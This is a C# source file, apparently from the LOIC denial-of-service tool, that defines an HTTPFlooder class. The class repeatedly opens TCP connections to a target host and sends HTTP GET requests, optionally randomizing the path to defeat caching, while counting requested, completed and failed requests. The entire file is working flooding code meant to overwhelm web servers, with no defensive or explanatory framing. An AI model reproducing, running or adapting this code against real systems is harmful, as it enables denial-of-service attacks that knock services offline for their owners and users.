namespace LOIC.Flooders
{
	#region using directives
	using System;
	using System.Collections.Generic;
	using System.Net.Sockets;
	using System.Text;
	using System.Threading;
	using System.Windows.Forms;
	#endregion

	public enum HttpRequestState
	{
		Unknown = 0x0,
		Ready = 0x1,
		Connecting = 0x2,
		Requesting = 0x3,
		Downloading = 0x4,
		Completed = 0x5,
		Failed = 0x6
	}

	public class HTTPFlooder : BaseFlooder
	{
		#region Fields
		protected static IList<TargetProtocol> protocols = new TargetProtocol[] { TargetProtocol.HTTP };

		private int timeout;
		private long lastAction;
		private string hostName;
		private string path;
		private bool acceptResponse;
		private bool randomizeRequest;
		private byte[] requestBuffer;
		private HttpRequestState state;

		private System.Windows.Forms.Timer timer;
		#endregion

		#region Properties
		// Supported protocols
		protected override IList<TargetProtocol> SupportedProtocols {
			get { return protocols; }
		}

		// HTTP request state
		public HttpRequestState RequestState {
			get { return state; }

			set {
				switch (value) {
				case HttpRequestState.Ready:
					lastAction = Tick;
					timer.Start ();
					break;
				case HttpRequestState.Downloading:
					Requested++;
					break;
				case HttpRequestState.Completed:
					Downloaded++;
					timer.Stop ();
					if (IsFlooding) {
						timer.Start ();
					}
					break;
				case HttpRequestState.Failed:
					Failed++;
					timer.Stop ();
					if (IsFlooding) {
						timer.Start ();
					}
					break;
				default:
					throw new NotSupportedException ();
				}
				
				state = value;
			}
		}

		// Counters
		public uint Downloaded { get; private set; }
		public uint Requested { get; private set; }
		public uint Failed { get; private set; }

		private long Tick {
			get { return DateTime.Now.Ticks / 10000; }
		}
		#endregion

		#region Constructor
		public HTTPFlooder (string hostName, string ip, int port, string path, bool resp, int delay, int timeout, bool randomizeRequest) : base(ip, port, delay, TargetProtocol.HTTP)
		{
			this.hostName = hostName;
			this.path = path;
			this.acceptResponse = resp;
			this.timeout = timeout;
			this.randomizeRequest = randomizeRequest;
			
			timer = new System.Windows.Forms.Timer ();
			timer.Tick += new EventHandler (Timer_Tick);
		}
		#endregion

		#region Methods
		protected override void OnStart ()
		{
			lastAction = Tick;
			timer.Start ();
			
			const string RequestFormat = "GET {0}{1} HTTP/1.1\nHost: {2}\n\n\n";
			
			string request;
			if (randomizeRequest) {
				request = string.Format (RequestFormat, path, Functions.RandomString (), hostName);
			} else {
				request = string.Format (RequestFormat, path, string.Empty, hostName);
			}
			
			requestBuffer = Encoding.ASCII.GetBytes (request);
		}

		protected override void OnRun ()
		{
			try {
				// Creates new socket
				RequestState = HttpRequestState.Ready;
				Socket socket = new Socket (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				
				// Attempts to connect
				RequestState = HttpRequestState.Connecting;
				while (IsFlooding) {
					try {
						socket.Connect (RemoteHost);
					} catch {
						continue;
					}
					
					break;
				}
				
				// Sends the HTTP GET request
				socket.Blocking = acceptResponse;
				RequestState = HttpRequestState.Requesting;
				socket.Send (requestBuffer, SocketFlags.None);
				
				// Accepts or ignores the HTTP response
				RequestState = HttpRequestState.Downloading;
				if (acceptResponse) {
					byte[] responseBuffer = new byte[64];
					socket.Receive (responseBuffer, 64, SocketFlags.None);
				}
				
				RequestState = HttpRequestState.Completed;
			} catch {
			} finally {
				Stop ();
			}
		}

		private void Timer_Tick (object sender, EventArgs e)
		{
			if (Tick > lastAction + timeout) {
				RequestState = HttpRequestState.Failed;
			}
		}
		#endregion
	}
}
